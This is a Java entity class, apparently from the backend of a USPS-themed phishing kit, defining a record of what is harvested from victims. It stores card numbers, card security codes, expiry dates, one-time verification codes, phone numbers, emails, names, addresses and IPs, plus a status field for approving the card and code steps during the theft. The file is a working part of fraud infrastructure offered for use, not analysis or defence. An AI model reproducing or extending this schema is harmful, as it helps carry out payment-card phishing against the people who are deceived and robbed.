package com.uspsassa.phishing.entity;

import io.swagger.v3.oas.annotations.media.Schema;
import lombok.Data;

@Schema
@Data
public class FishComplet {
    /**
     * id
     */
    @Schema(description = "id")
    private Integer id;

    /**
     * ip地址
     */
    @Schema(description = "ip地址")
    private String ip;

    /**
     * 设备类型
     */
    @Schema(description = "设备类型")
    private String deviceType;

    /**
     * 完成时的状态
     */
    @Schema(description = "完成时的状态 卡放行 验证码放行")
    private String status;

    /**
     * 验证码
     */
    @Schema(description = "验证码")
    private String verificationCode;

    /**
     * 安全码
     */
    @Schema(description = "安全码")
    private String securityCode;

    /**
     * 邮政编码
     */
    @Schema(description = "邮政编码")
    private String zipCode;

    /**
     * 失效日期
     */
    @Schema(description = "失效日期")
    private String expDate;

    /**
     * 卡号
     */
    @Schema(description = "卡号")
    private String cardNumber;

    /**
     * 手机号
     */
    @Schema(description = "手机号")
    private String phoneNumber;

    /**
     * socket的id
     */
    @Schema(description = "socket的id")
    private String sid;

    /**
     * 州
     */
    @Schema(description = "邮箱")
    private String email;

    /**
     * 城市
     */
    @Schema(description = "城市")
    private String city;

    /**
     * 可选地址
     */
    @Schema(description = "可选地址")
    private String addressOption;

    /**
     * 地址
     */
    @Schema(description = "地址")
    private String address;

    /**
     * 名称
     */
    @Schema(description = "名称")
    private String name;

    /**
     * 完成时间（时间戳）
     */
    @Schema(description = "完成时间（时间戳）")
    private Long completeTime;
}